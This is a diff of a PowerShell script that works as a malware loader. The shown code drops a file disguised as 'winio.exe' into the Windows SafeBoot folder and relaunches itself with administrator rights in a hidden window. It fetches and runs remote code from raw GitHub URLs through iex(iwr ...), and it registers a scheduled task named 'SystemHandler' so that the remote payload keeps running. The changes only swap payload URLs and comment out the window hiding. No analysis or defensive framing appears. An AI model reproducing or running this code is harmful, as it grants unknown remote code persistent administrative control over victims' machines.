@@ -1,6 +1,7 @@
 $install_path = "C:\Windows\System32\SafeBoot\winio.exe"
 $install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/c_q"
-$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i_q"
+$ina_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i_q"
+$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u"
 
 Add-Type -TypeDefinition @"
 using System; 
@@ -20,11 +21,11 @@ public class WindowHelper
     }
 }
 "@; 
-[WindowHelper]::HideWindow();
+#[WindowHelper]::HideWindow();
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
-    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr '" + $install_url + "' -UseBasicP)") -Verb RunAs -PassThru;
+    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr '" + $ina_url + "' -UseBasicP)") -Verb RunAs -PassThru;
     $newProc.WaitForExit();
     exit;
 }
@@ -98,7 +99,7 @@ try
 
     # Define task parameters
     $taskName = "SystemHandler"
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'iex (iwr \"https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i\" -UseBasicP)'"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'iex (iwr \"https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u\" -UseBasicP)'"
 
     # Create the scheduled task object and register it
     Register-ScheduledTask -TaskName $taskName `
